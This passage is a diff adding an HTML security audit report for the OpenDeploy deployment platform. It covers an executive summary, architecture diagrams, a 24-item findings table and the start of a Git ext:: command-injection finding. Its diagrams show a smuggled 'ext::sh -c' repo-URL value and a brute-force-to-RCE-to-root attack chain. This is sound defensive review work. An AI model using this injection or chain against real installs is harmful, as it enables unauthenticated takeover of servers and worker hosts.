@@ -1,0 +1,1155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OpenDeploy (opsagent) — Security Review</title>
+<style>
+  :root{
+    --crit:#b91c1c; --high:#ea580c; --med:#ca8a04; --low:#0e7490; --safe:#059669;
+    --ink:#0f172a; --sub:#475569; --line:#e2e8f0; --bg:#f8fafc; --card:#ffffff;
+    --code-bg:#0f172a; --code-ink:#e2e8f0; --accent:#2563eb;
+    --slate:#334155; --violet:#7c3aed;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;font:16px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--ink);background:var(--bg)}
+  code,pre,.mono{font-family:"SF Mono",SFMono-Regular,ui-monospace,"Cascadia Code",Menlo,Consolas,monospace}
+  a{color:var(--accent);text-decoration:none}
+  a:hover{text-decoration:underline}
+
+  header.hero{background:linear-gradient(135deg,#0f172a,#1e293b);color:#f1f5f9;padding:48px 24px 40px}
+  .hero-inner{max-width:1080px;margin:0 auto}
+  .hero h1{margin:0 0 6px;font-size:30px;letter-spacing:-.5px}
+  .hero .tag{color:#94a3b8;font-size:15px}
+  .hero .meta{margin-top:22px;display:flex;flex-wrap:wrap;gap:10px 26px;font-size:13.5px;color:#cbd5e1}
+  .hero .meta b{color:#f1f5f9;font-weight:600}
+
+  .wrap{max-width:1080px;margin:0 auto;padding:32px 24px 80px}
+  section{margin:0 0 40px}
+  h2{font-size:22px;margin:36px 0 14px;padding-bottom:8px;border-bottom:2px solid var(--line);letter-spacing:-.3px}
+  h3{font-size:17px;margin:24px 0 8px}
+  p{margin:10px 0}
+  ul{margin:10px 0 10px 2px;padding-left:20px}
+  li{margin:5px 0}
+
+  .lead{font-size:16.5px;color:var(--sub)}
+
+  /* severity chips */
+  .chip{display:inline-block;padding:2px 10px;border-radius:999px;font-size:12px;font-weight:700;color:#fff;letter-spacing:.3px;vertical-align:middle}
+  .c-crit{background:var(--crit)} .c-high{background:var(--high)} .c-med{background:var(--med)} .c-low{background:var(--low)} .c-safe{background:var(--safe)}
+  .cwe{display:inline-block;padding:2px 8px;border-radius:6px;font-size:11.5px;font-weight:600;background:#eef2ff;color:#3730a3;border:1px solid #e0e7ff}
+
+  /* summary cards */
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px;margin:18px 0}
+  .stat{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;box-shadow:0 1px 2px rgba(15,23,42,.04)}
+  .stat .n{font-size:30px;font-weight:800;line-height:1}
+  .stat .l{font-size:13px;color:var(--sub);margin-top:4px;font-weight:600;text-transform:uppercase;letter-spacing:.4px}
+  .stat.crit{border-top:4px solid var(--crit)} .stat.high{border-top:4px solid var(--high)}
+  .stat.med{border-top:4px solid var(--med)} .stat.low{border-top:4px solid var(--low)}
+
+  /* TOC */
+  .toc{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 20px}
+  .toc table{width:100%;border-collapse:collapse;font-size:14px}
+  .toc td{padding:6px 8px;border-bottom:1px solid #f1f5f9;vertical-align:top}
+  .toc tr:last-child td{border-bottom:none}
+  .toc td.id{white-space:nowrap;font-weight:700;font-family:ui-monospace,monospace;color:var(--sub);width:64px}
+  .toc td.sev{white-space:nowrap;width:86px}
+
+  /* finding cards */
+  .finding{background:var(--card);border:1px solid var(--line);border-left-width:6px;border-radius:12px;padding:22px 24px;margin:22px 0;box-shadow:0 1px 3px rgba(15,23,42,.05)}
+  .finding.sev-crit{border-left-color:var(--crit)}
+  .finding.sev-high{border-left-color:var(--high)}
+  .finding.sev-med{border-left-color:var(--med)}
+  .finding.sev-low{border-left-color:var(--low)}
+  .finding h3{margin:0 0 4px;font-size:18.5px;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+  .finding h3 .fid{font-family:ui-monospace,monospace;color:var(--sub);font-size:15px}
+  .badges{margin:8px 0 12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+  .kv{margin:12px 0}
+  .kv .k{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--sub);margin-bottom:3px}
+  .loc{font-family:ui-monospace,monospace;font-size:13px;background:#f1f5f9;border:1px solid var(--line);border-radius:6px;padding:2px 7px;display:inline-block;margin:2px 4px 2px 0;color:#334155}
+  .label{font-weight:700;color:var(--ink)}
+  pre{background:var(--code-bg);color:var(--code-ink);border-radius:10px;padding:14px 16px;overflow-x:auto;font-size:13px;line-height:1.5;margin:10px 0}
+  pre .cm{color:#64748b}
+  pre .rd{color:#fca5a5}
+  pre .gr{color:#86efac}
+  code.inl{background:#f1f5f9;border:1px solid var(--line);border-radius:5px;padding:1px 5px;font-size:13.5px;color:#b91c1c}
+  .fix{background:#ecfdf5;border:1px solid #a7f3d0;border-radius:10px;padding:12px 16px;margin-top:12px}
+  .fix .k{color:#047857}
+  .callout{background:#fffbeb;border:1px solid #fde68a;border-radius:10px;padding:12px 16px;margin:14px 0}
+  .callout.info{background:#eff6ff;border-color:#bfdbfe}
+
+  /* diagrams */
+  .diagram{margin:16px 0;border:1px solid var(--line);border-radius:12px;background:#fcfdff;padding:14px;overflow-x:auto}
+  .diagram svg{display:block;max-width:100%;height:auto;margin:0 auto}
+  .dcap{font-size:12.5px;color:var(--sub);text-align:center;margin-top:8px;font-style:italic}
+  svg text{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+
+  table.plain{width:100%;border-collapse:collapse;font-size:14px;margin:12px 0}
+  table.plain th,table.plain td{border:1px solid var(--line);padding:8px 10px;text-align:left;vertical-align:top}
+  table.plain th{background:#f1f5f9;font-size:12.5px;text-transform:uppercase;letter-spacing:.4px;color:var(--sub)}
+  .safe-list li{margin:7px 0}
+  footer{border-top:1px solid var(--line);margin-top:40px;padding-top:18px;color:var(--sub);font-size:13px}
+  .back{font-size:12.5px;color:var(--sub)}
+  @media print{.finding,.stat,.toc,.diagram{box-shadow:none}body{background:#fff}}
+</style>
+</head>
+<body>
+
+<!-- shared SVG defs (arrow markers) -->
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><defs>
+  <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+    <path d="M0,0 L10,5 L0,10 z" fill="#334155"/>
+  </marker>
+  <marker id="arrowred" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+    <path d="M0,0 L10,5 L0,10 z" fill="#b91c1c"/>
+  </marker>
+  <marker id="arrowgreen" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+    <path d="M0,0 L10,5 L0,10 z" fill="#059669"/>
+  </marker>
+</defs></svg>
+
+<header class="hero">
+  <div class="hero-inner">
+    <h1>Security Review — OpenDeploy <span style="color:#64748b">(opsagent)</span></h1>
+    <div class="tag">Deployment &amp; cluster orchestration platform · Go backend + VanJS SPA · passkey auth · encrypted secrets · container/systemd engine</div>
+    <div class="meta">
+      <span><b>Date:</b> 2 July 2026</span>
+      <span><b>Scope:</b> full repository (258 files; 141 Go, 39 JS)</span>
+      <span><b>Branch:</b> main (clean tree)</span>
+      <span><b>Method:</b> manual source review, multi-domain</span>
+      <span><b>Findings:</b> 24 (2 Critical · 5 High · 7 Medium · 10 Low)</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+
+<!-- ===================== EXECUTIVE SUMMARY ===================== -->
+<section id="summary">
+  <h2>Executive summary</h2>
+  <p class="lead">
+    OpenDeploy makes strong foundational choices — XChaCha20-Poly1305 for secrets, Ed25519 mTLS on a
+    dedicated cluster port, argon2id password hashing, TLS 1.3, WebAuthn passkeys, and parameterized SQL
+    throughout. The primitives are modern and, for the most part, correctly applied. The serious issues are
+    not broken cryptography; they are <span class="label">trust-boundary and privilege problems</span>: a
+    reachable command-execution sink, a service account that is root in all but name, a weak bootstrap
+    credential on an unauthenticated endpoint, and cluster/worker interfaces that hand out more than the
+    caller should be able to see.
+  </p>
+
+  <div class="grid">
+    <div class="stat crit"><div class="n" style="color:var(--crit)">2</div><div class="l">Critical</div></div>
+    <div class="stat high"><div class="n" style="color:var(--high)">5</div><div class="l">High</div></div>
+    <div class="stat med"><div class="n" style="color:var(--med)">7</div><div class="l">Medium</div></div>
+    <div class="stat low"><div class="n" style="color:var(--low)">10</div><div class="l">Low / Info</div></div>
+  </div>
+
+  <div class="diagram">
+    <svg viewBox="0 0 900 150" role="img" aria-label="Severity distribution">
+      <text x="10" y="24" font-size="13" font-weight="700" fill="#475569">SEVERITY DISTRIBUTION</text>
+      <!-- bars -->
+      <g font-size="13" font-weight="700" fill="#fff">
+        <rect x="120" y="36" width="120" height="22" rx="4" fill="#b91c1c"/><text x="132" y="52">Critical · 2</text>
+        <rect x="120" y="64" width="300" height="22" rx="4" fill="#ea580c"/><text x="132" y="80">High · 5</text>
+        <rect x="120" y="92" width="420" height="22" rx="4" fill="#ca8a04"/><text x="132" y="108">Medium · 7</text>
+        <rect x="120" y="120" width="600" height="22" rx="4" fill="#0e7490"/><text x="132" y="136">Low / Info · 10</text>
+      </g>
+    </svg>
+  </div>
+
+  <h3>The single most important chain</h3>
+  <p>
+    Three findings compose into <span class="label">unauthenticated remote code execution, then root</span>, on a
+    default primary install that has not yet been hardened. This is the risk to fix first.
+  </p>
+
+  <div class="diagram">
+    <svg viewBox="0 0 920 300" role="img" aria-label="Unauthenticated RCE-to-root kill chain">
+      <!-- boundary -->
+      <rect x="8" y="34" width="184" height="240" rx="10" fill="#fef2f2" stroke="#fca5a5" stroke-dasharray="5 4"/>
+      <text x="20" y="54" font-size="12" font-weight="700" fill="#b91c1c">INTERNET (unauthenticated)</text>
+      <rect x="212" y="34" width="700" height="240" rx="10" fill="#f8fafc" stroke="#cbd5e1" stroke-dasharray="5 4"/>
+      <text x="224" y="54" font-size="12" font-weight="700" fill="#475569">PRIMARY HOST</text>
+
+      <!-- attacker -->
+      <rect x="26" y="120" width="150" height="66" rx="8" fill="#b91c1c"/>
+      <text x="101" y="150" text-anchor="middle" font-size="14" font-weight="700" fill="#fff">Attacker</text>
+      <text x="101" y="168" text-anchor="middle" font-size="11.5" fill="#fee2e2">no credentials</text>
+
+      <!-- step 1 -->
+      <rect x="240" y="70" width="200" height="60" rx="8" fill="#fff" stroke="#ea580c" stroke-width="2"/>
+      <text x="340" y="92" text-anchor="middle" font-size="12.5" font-weight="700" fill="#0f172a">1 · POST /v1/auth/master</text>
+      <text x="340" y="110" text-anchor="middle" font-size="11" fill="#475569">guess opendeployNNNN (10⁴)</text>
+      <text x="340" y="123" text-anchor="middle" font-size="11" fill="#b91c1c">no rate limit → auto-creates user</text>
+
+      <!-- step 2 -->
+      <rect x="240" y="150" width="200" height="52" rx="8" fill="#fff" stroke="#ea580c" stroke-width="2"/>
+      <text x="340" y="171" text-anchor="middle" font-size="12.5" font-weight="700" fill="#0f172a">2 · register passkey</text>
+      <text x="340" y="189" text-anchor="middle" font-size="11" fill="#475569">→ 7-day admin token</text>
+
+      <!-- step 3 -->
+      <rect x="470" y="90" width="210" height="60" rx="8" fill="#fff" stroke="#b91c1c" stroke-width="2"/>
+      <text x="575" y="112" text-anchor="middle" font-size="12.5" font-weight="700" fill="#0f172a">3 · POST /v1/repo/validate</text>
+      <text x="575" y="130" text-anchor="middle" font-size="11" fill="#b91c1c">repoUrl = ext::sh -c "…"</text>
+      <text x="575" y="143" text-anchor="middle" font-size="10.5" fill="#475569">git ls-remote → RCE (opsagent uid)</text>
+
+      <!-- step 4 -->
+      <rect x="710" y="90" width="185" height="60" rx="8" fill="#7f1d1d"/>
+      <text x="802" y="114" text-anchor="middle" font-size="13" font-weight="700" fill="#fff">4 · ROOT</text>
+      <text x="802" y="132" text-anchor="middle" font-size="10.5" fill="#fecaca">CAP_SETUID / sudo restart</text>
+
+      <!-- workers -->
+      <rect x="710" y="196" width="185" height="52" rx="8" fill="#334155"/>
+      <text x="802" y="218" text-anchor="middle" font-size="12" font-weight="700" fill="#fff">All worker hosts</text>
+      <text x="802" y="235" text-anchor="middle" font-size="10.5" fill="#cbd5e1">deploy = code exec everywhere</text>
+
+      <!-- arrows -->
+      <line x1="176" y1="150" x2="238" y2="100" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+      <line x1="340" y1="130" x2="340" y2="148" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+      <line x1="440" y1="176" x2="490" y2="150" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+      <line x1="680" y1="120" x2="708" y2="120" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+      <line x1="802" y1="150" x2="802" y2="194" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+    </svg>
+    <div class="dcap">OD-03 (weak bootstrap) → OD-01 (git ext:: RCE) → OD-02 (service→root). Each step is verified in source below.</div>
+  </div>
+
+  <h3>Top risks at a glance</h3>
+  <ul>
+    <li><b><a href="#od-01">OD-01 · Critical</a></b> — Unvalidated repo URLs reach <code class="inl">git ls-remote</code>; Git's <code class="inl">ext::</code> transport turns that into command execution.</li>
+    <li><b><a href="#od-02">OD-02 · Critical</a></b> — The <code class="inl">opendeploy</code> service is root-equivalent: ambient <code class="inl">CAP_SETUID</code>/<code class="inl">CAP_SYS_ADMIN</code>, <code class="inl">NoNewPrivileges</code> off, a service-writable executable, and passwordless <code class="inl">sudo</code> restart.</li>
+    <li><b><a href="#od-03">OD-03 · High</a></b> — Weak, unauthenticated, un-rate-limited master-password bootstrap that auto-provisions admin accounts.</li>
+    <li><b><a href="#od-04">OD-04 · High</a></b> — Any single enrolled worker can read <em>every</em> secret, config, and the GitHub token.</li>
+    <li><b><a href="#od-05">OD-05 · High</a></b> — Worker enrollment disables TLS verification, so an on-path attacker owns a joining node.</li>
+    <li><b><a href="#od-06">OD-06/07 · High</a></b> — Containers for untrusted images run with host networking, no seccomp, root by default, and arbitrary host bind mounts.</li>
+  </ul>
+</section>
+
+<!-- ===================== TRUST MODEL ===================== -->
+<section id="trust-model">
+  <h2>Trust model &amp; how severities are calibrated</h2>
+  <p>
+    Per <code class="inl">docs/engineering/auth.md</code> and confirmed in code, OpenDeploy is a
+    <span class="label">single-admin tool</span>. There is one privileged scope
+    (<code class="inl">default</code>) and one bootstrap scope (<code class="inl">passkey:create</code>);
+    every authenticated caller is the full administrator. "Spaces" are an organizational label, not a
+    security boundary, and there is no per-user or per-space authorization.
+  </p>
+  <p>This shapes severity in two directions, and I have applied it honestly throughout:</p>
+  <ul>
+    <li><b>It lowers some issues.</b> Cross-space "IDOR"-style access (acting on another space's secret/asset by
+      id) is <em>by design</em> today — it is not scored as a vulnerability, only flagged as a latent risk if a
+      lower-trust role is ever introduced. The admin can already run arbitrary Nix builds (= arbitrary host code),
+      so "malicious config" is not, by itself, privilege escalation.</li>
+    <li><b>It does <u>not</u> excuse the serious findings.</b> The issues scored Critical/High survive the
+      single-admin model because they each cross a boundary the model still relies on: they grant
+      <em>unauthenticated</em> access (OD-01 via OD-03), escalate the service/admin to <em>root</em> (OD-02),
+      let a <em>compromised worker</em> or <em>malicious container image</em> exceed its intended reach
+      (OD-04, OD-06/07), or let a <em>network attacker</em> take over a node (OD-05). "Encrypted at rest"
+      and "runs as a non-root user" are claims the product makes; these findings show where those claims
+      do not hold.</li>
+  </ul>
+</section>
+
+<!-- ===================== ARCHITECTURE ===================== -->
+<section id="architecture">
+  <h2>Architecture &amp; trust boundaries</h2>
+  <p>The reviewed system and where each finding sits. Solid arrows are normal flows; ⚠ badges mark finding locations.</p>
+  <div class="diagram">
+    <svg viewBox="0 0 940 470" role="img" aria-label="System architecture and trust boundaries">
+      <!-- Internet zone -->
+      <rect x="8" y="30" width="200" height="200" rx="10" fill="#fef2f2" stroke="#fca5a5" stroke-dasharray="5 4"/>
+      <text x="20" y="50" font-size="12" font-weight="700" fill="#b91c1c">UNTRUSTED / INTERNET</text>
+      <rect x="30" y="70" width="156" height="52" rx="8" fill="#2563eb"/>
+      <text x="108" y="92" text-anchor="middle" font-size="13" font-weight="700" fill="#fff">Browser SPA</text>
+      <text x="108" y="109" text-anchor="middle" font-size="10.5" fill="#dbeafe">VanJS · JWT in localStorage</text>
+      <rect x="30" y="140" width="156" height="46" rx="8" fill="#b91c1c"/>
+      <text x="108" y="162" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">Attacker</text>
+      <text x="108" y="178" text-anchor="middle" font-size="10.5" fill="#fee2e2">⚠ OD-03 · OD-05 · OD-11</text>
+
+      <!-- Primary host zone -->
+      <rect x="232" y="30" width="420" height="410" rx="10" fill="#f8fafc" stroke="#94a3b8" stroke-dasharray="5 4"/>
+      <text x="244" y="50" font-size="12" font-weight="700" fill="#334155">PRIMARY HOST — opendeploy service (⚠ OD-02: root-equivalent)</text>
+
+      <rect x="250" y="66" width="180" height="48" rx="8" fill="#334155"/>
+      <text x="340" y="86" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">HTTP API :443</text>
+      <text x="340" y="102" text-anchor="middle" font-size="10.5" fill="#cbd5e1">handlers · JWT auth</text>
+
+      <rect x="452" y="66" width="180" height="48" rx="8" fill="#334155"/>
+      <text x="542" y="86" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">Cluster mTLS :9443</text>
+      <text x="542" y="102" text-anchor="middle" font-size="10.5" fill="#cbd5e1">⚠ OD-04 over-reach</text>
+
+      <rect x="250" y="128" width="180" height="48" rx="8" fill="#475569"/>
+      <text x="340" y="148" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">Enrollment :9444</text>
+      <text x="340" y="164" text-anchor="middle" font-size="10.5" fill="#cbd5e1">TLS, no client cert</text>
+
+      <rect x="452" y="128" width="180" height="48" rx="8" fill="#7c3aed"/>
+      <text x="542" y="148" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">Secrets store</text>
+      <text x="542" y="164" text-anchor="middle" font-size="10.5" fill="#ede9fe">SMK · machine.key</text>
+
+      <rect x="250" y="190" width="180" height="46" rx="8" fill="#7c3aed"/>
+      <text x="340" y="210" text-anchor="middle" font-size="12" font-weight="700" fill="#fff">SQLite primary.db</text>
+      <text x="340" y="226" text-anchor="middle" font-size="10.5" fill="#ede9fe">⚠ OD-10 perms</text>
+
+      <rect x="452" y="190" width="180" height="46" rx="8" fill="#334155"/>
+      <text x="542" y="210" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">Engine</text>
+      <text x="542" y="226" text-anchor="middle" font-size="10.5" fill="#cbd5e1">preparers · runners</text>
+
+      <!-- preparers -->
+      <rect x="250" y="252" width="382" height="52" rx="8" fill="#fff" stroke="#b91c1c" stroke-width="2"/>
+      <text x="441" y="273" text-anchor="middle" font-size="12.5" font-weight="700" fill="#0f172a">Preparers: git / nix / gh-release</text>
+      <text x="441" y="291" text-anchor="middle" font-size="10.5" fill="#b91c1c">⚠ OD-01 git ext:: RCE · OD-09 no signature check</text>
+
+      <!-- containerd -->
+      <rect x="250" y="318" width="382" height="52" rx="8" fill="#fff" stroke="#ea580c" stroke-width="2"/>
+      <text x="441" y="339" text-anchor="middle" font-size="12.5" font-weight="700" fill="#0f172a">containerd (root) → containers</text>
+      <text x="441" y="357" text-anchor="middle" font-size="10.5" fill="#ea580c">⚠ OD-06 host net / no seccomp · OD-07 host mounts</text>
+
+      <rect x="250" y="384" width="382" height="44" rx="8" fill="#334155"/>
+      <text x="441" y="411" text-anchor="middle" font-size="11.5" fill="#fff">sudoers: NOPASSWD systemctl restart (⚠ OD-02 path)</text>
+
+      <!-- Worker zone -->
+      <rect x="676" y="30" width="256" height="410" rx="10" fill="#f0fdf4" stroke="#86efac" stroke-dasharray="5 4"/>
+      <text x="688" y="50" font-size="12" font-weight="700" fill="#047857">WORKER HOSTS</text>
+      <rect x="700" y="150" width="208" height="66" rx="8" fill="#334155"/>
+      <text x="804" y="178" text-anchor="middle" font-size="13" font-weight="700" fill="#fff">Secondary / worker</text>
+      <text x="804" y="196" text-anchor="middle" font-size="10.5" fill="#cbd5e1">mTLS client · caches secrets</text>
+      <text x="804" y="300" text-anchor="middle" font-size="11" fill="#047857">A compromised worker</text>
+      <text x="804" y="316" text-anchor="middle" font-size="11" fill="#047857">reads the whole store (OD-04)</text>
+
+      <!-- arrows -->
+      <line x1="186" y1="94" x2="248" y2="90" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+      <text x="196" y="82" font-size="10" fill="#475569">HTTPS+JWT</text>
+      <line x1="632" y1="90" x2="700" y2="165" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+      <line x1="700" y1="200" x2="632" y2="150" stroke="#059669" stroke-width="1.6" marker-end="url(#arrowgreen)"/>
+      <text x="640" y="230" font-size="10" fill="#047857">fetch secrets</text>
+      <line x1="186" y1="160" x2="248" y2="150" stroke="#b91c1c" stroke-width="1.6" marker-end="url(#arrowred)"/>
+    </svg>
+    <div class="dcap">Ports and flows verified in <code>backend/main.go</code>, <code>backend/primary/primary.go</code>, and the engine packages.</div>
+  </div>
+</section>
+
+<!-- ===================== TOC ===================== -->
+<section id="toc">
+  <h2>All findings</h2>
+  <div class="toc">
+    <table>
+      <tr><td class="id">OD-01</td><td class="sev"><span class="chip c-crit">CRITICAL</span></td><td><a href="#od-01">RCE via Git <code>ext::</code> transport in repo URL handling</a></td></tr>
+      <tr><td class="id">OD-02</td><td class="sev"><span class="chip c-crit">CRITICAL</span></td><td><a href="#od-02">Service account is root-equivalent (ambient caps + writable ExecStart + sudo restart)</a></td></tr>
+      <tr><td class="id">OD-03</td><td class="sev"><span class="chip c-high">HIGH</span></td><td><a href="#od-03">Weak, unauthenticated, un-rate-limited master-password bootstrap</a></td></tr>
+      <tr><td class="id">OD-04</td><td class="sev"><span class="chip c-high">HIGH</span></td><td><a href="#od-04">Any worker can read the entire secret store, configs, and GitHub token</a></td></tr>
+      <tr><td class="id">OD-05</td><td class="sev"><span class="chip c-high">HIGH</span></td><td><a href="#od-05">Enrollment disables TLS verification → worker takeover via MITM</a></td></tr>
+      <tr><td class="id">OD-06</td><td class="sev"><span class="chip c-high">HIGH</span></td><td><a href="#od-06">Weak container isolation for untrusted images</a></td></tr>
+      <tr><td class="id">OD-07</td><td class="sev"><span class="chip c-high">HIGH</span></td><td><a href="#od-07">Arbitrary host-path bind mounts into containers</a></td></tr>
+      <tr><td class="id">OD-08</td><td class="sev"><span class="chip c-med">MEDIUM</span></td><td><a href="#od-08">SSRF via registry host and auth-realm / Link redirect following</a></td></tr>
+      <tr><td class="id">OD-09</td><td class="sev"><span class="chip c-med">MEDIUM</span></td><td><a href="#od-09">No signature verification of downloaded binaries/images; curl|bash from <code>main</code></a></td></tr>
+      <tr><td class="id">OD-10</td><td class="sev"><span class="chip c-med">MEDIUM</span></td><td><a href="#od-10">SQLite DB (master hash + encrypted secrets) is group-readable</a></td></tr>
+      <tr><td class="id">OD-11</td><td class="sev"><span class="chip c-med">MEDIUM</span></td><td><a href="#od-11">Unauthenticated enrollment: DoS, panic-on-error, spoofable client IP</a></td></tr>
+      <tr><td class="id">OD-12</td><td class="sev"><span class="chip c-med">MEDIUM</span></td><td><a href="#od-12">Restore leaks S3 key + secrets recovery code via process argv</a></td></tr>
+      <tr><td class="id">OD-13</td><td class="sev"><span class="chip c-med">MEDIUM</span></td><td><a href="#od-13">7-day JWT in localStorage + no Content-Security-Policy</a></td></tr>
+      <tr><td class="id">OD-14</td><td class="sev"><span class="chip c-med">MEDIUM</span></td><td><a href="#od-14">Config export bypasses redaction applied on other read paths</a></td></tr>
+      <tr><td class="id">OD-15</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">GitHub token embedded in git subprocess argv</a></td></tr>
+      <tr><td class="id">OD-16</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">World-writable (0777/0666) readiness dir &amp; socket</a></td></tr>
+      <tr><td class="id">OD-17</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">JWT accepted-algorithm not pinned (latent alg-confusion)</a></td></tr>
+      <tr><td class="id">OD-18</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">No token revocation; master login never disabled after passkey</a></td></tr>
+      <tr><td class="id">OD-19</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">Enrollment accept lacks CN-collision check</a></td></tr>
+      <tr><td class="id">OD-20</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">Cluster CA unconstrained; leaf certs omit BasicConstraints</a></td></tr>
+      <tr><td class="id">OD-21</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">Frontend <code>target=_blank</code> without noopener; unencoded repo in href</a></td></tr>
+      <tr><td class="id">OD-22</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">Verbose request/response console logging in production bundle</a></td></tr>
+      <tr><td class="id">OD-23</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">No foreign-key enforcement; space deletion orphans rows</a></td></tr>
+      <tr><td class="id">OD-24</td><td class="sev"><span class="chip c-low">LOW</span></td><td><a href="#od-lows">Migration split &amp; error-swallowing; user-config id race → panic</a></td></tr>
+    </table>
+  </div>
+</section>
+
+<!-- ===================== CRITICAL FINDINGS ===================== -->
+<section id="findings-critical">
+  <h2>Critical findings</h2>
+
+  <!-- OD-01 -->
+  <div class="finding sev-crit" id="od-01">
+    <h3><span class="fid">OD-01</span> Remote code execution via Git <code>ext::</code> transport in repo-URL handling</h3>
+    <div class="badges">
+      <span class="chip c-crit">CRITICAL</span>
+      <span class="cwe">CWE-78 OS Command Injection</span>
+      <span class="cwe">CWE-88 Argument Injection</span>
+      <span class="cwe">CWE-20 Improper Input Validation</span>
+    </div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/engine/preparer/gitmanager.go:54–86</span>
+      <span class="loc">…:106, 133 (ls-remote sink)</span>
+      <span class="loc">backend/handler/repo_validate.go:42–53</span>
+      <span class="loc">backend/handler/deployments.go:188–228</span>
+    </div>
+
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>User-supplied repository URLs flow to <code class="inl">git ls-remote</code> with essentially no
+      validation. <code class="inl">resolveCloneURL</code> rejects only NUL/CR/LF and, for any string
+      containing <code class="inl">://</code>, returns it <span class="label">verbatim</span> when it does not
+      parse as a clean <code class="inl">http(s)</code> URL:</p>
+      <pre><span class="cm">// gitmanager.go — resolveCloneURL</span>
+if strings.Contains(repoURL, <span class="gr">"://"</span>) {
+    u, err := url.Parse(repoURL)
+    if err == nil && (u.Scheme == <span class="gr">"https"</span> || u.Scheme == <span class="gr">"http"</span>) && !strings.HasSuffix(u.Path, <span class="gr">".git"</span>) {
+        u.Path += <span class="gr">".git"</span>; repoURL = u.String()
+    }
+    <span class="rd">return injectGithubToken(repoURL, githubToken)  // ext:: string returned unchanged</span>
+}
+<span class="cm">// …later:</span> exec.CommandContext(ctx, <span class="gr">"git"</span>, <span class="gr">"ls-remote"</span>, <span class="gr">"--heads"</span>, cloneURL)</pre>
+      <p>Git supports the <code class="inl">ext::</code> remote helper, which <em>executes a command</em>.
+      Because OpenDeploy calls <code class="inl">git</code> directly (top-level, not a submodule), Git's
+      default <code class="inl">protocol.ext.allow=user</code> policy <span class="label">permits</span> it, and
+      nothing sets <code class="inl">GIT_ALLOW_PROTOCOL</code> (verified — no such guard anywhere in the tree).
+      The Go call passes arguments as a slice (no shell), but the command execution happens <em>inside Git's own
+      transport layer</em>, so that does not help. There is also no <code class="inl">--</code> separator before
+      the URL, permitting flag injection for URLs beginning with <code class="inl">-</code>.</p>
+    </div>
+
+    <div class="diagram">
+      <svg viewBox="0 0 900 190" role="img" aria-label="git ext:: data flow">
+        <rect x="14" y="70" width="150" height="54" rx="8" fill="#b91c1c"/>
+        <text x="89" y="94" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">Attacker input</text>
+        <text x="89" y="111" text-anchor="middle" font-size="10.5" fill="#fee2e2">repoUrl = ext::sh -c …</text>
+
+        <rect x="196" y="70" width="160" height="54" rx="8" fill="#fff" stroke="#334155" stroke-width="1.5"/>
+        <text x="276" y="92" text-anchor="middle" font-size="12" font-weight="700" fill="#0f172a">PostV1RepoValidate</text>
+        <text x="276" y="109" text-anchor="middle" font-size="10.5" fill="#475569">whitespace check only</text>
+
+        <rect x="388" y="70" width="170" height="54" rx="8" fill="#fff" stroke="#b91c1c" stroke-width="2"/>
+        <text x="473" y="92" text-anchor="middle" font-size="12" font-weight="700" fill="#0f172a">resolveCloneURL</text>
+        <text x="473" y="109" text-anchor="middle" font-size="10.5" fill="#b91c1c">returns string verbatim</text>
+
+        <rect x="590" y="70" width="150" height="54" rx="8" fill="#fff" stroke="#334155" stroke-width="1.5"/>
+        <text x="665" y="92" text-anchor="middle" font-size="11.5" font-weight="700" fill="#0f172a">git ls-remote</text>
+        <text x="665" y="109" text-anchor="middle" font-size="10.5" fill="#475569">ext:: helper</text>
+
+        <rect x="772" y="70" width="116" height="54" rx="8" fill="#7f1d1d"/>
+        <text x="830" y="94" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">RCE</text>
+        <text x="830" y="111" text-anchor="middle" font-size="10" fill="#fecaca">opsagent uid</text>
+
+        <line x1="164" y1="97" x2="194" y2="97" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
